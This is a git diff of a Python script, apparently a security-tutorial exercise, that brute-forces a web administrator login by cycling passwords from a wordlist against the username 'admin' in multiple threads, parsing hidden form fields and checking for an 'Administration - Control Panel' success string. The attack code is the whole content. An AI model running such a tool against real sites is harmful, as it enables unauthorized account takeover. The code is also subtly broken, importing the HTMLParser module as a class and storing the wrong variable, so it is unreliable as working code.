@@ -2,14 +2,20 @@ import urllib3
 import urllib
 from urllib import request, parse
 import threading
+import HTMLParser
 import sys
 import queue
 import html.parser
 import http.cookiejar
+from BruteForceContent import build_wordlist
 
 user_thread = 10
+
+# set username, wordslist here and then run
 username = "admin"
 wordlist_file = "/tmp/cain.txt"
+
+
 resume = None
 
 # where script will donload and parse HTML
@@ -24,7 +30,7 @@ password_field = "passwd"
 success_check = "Administration - Control Panel"
 
 
-class Bruter():
+class Bruter:
     def __init__(self, username, words):
         self.username = username
         self.password_q = words
@@ -55,6 +61,7 @@ class Bruter():
 
             print("Trying %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
 
+            # parse on hidden fields
             parser = BruteParser()
             parser.feed(page)
 
@@ -75,3 +82,28 @@ class Bruter():
                 print("[*] Username: %s" % username)
                 print("[*] Password: %s" % brute)
                 print("[*] Waiting for all threads to finish...")
+
+class BruteParser(HTMLParser):
+    def __init__(self):
+        HTMLParser.__init__(self)
+        # dictionary to store results
+        self.tag_results = {}
+
+    def handle_starttag(self, tag, attrs):
+        if tag == "input":
+            tag_name = None
+            tag_value = None
+            for name, value in attrs:
+                if name == "name":
+                    tag_name = value
+                if name == "value":
+                    tag_value = value
+
+            if tag_name is not None:
+                self.tag_results[tag_name] = value
+
+
+words = build_wordlist(wordlist_file)
+
+bruter_obj = Bruter(username, words)
+bruter_obj.run_bruteforce()
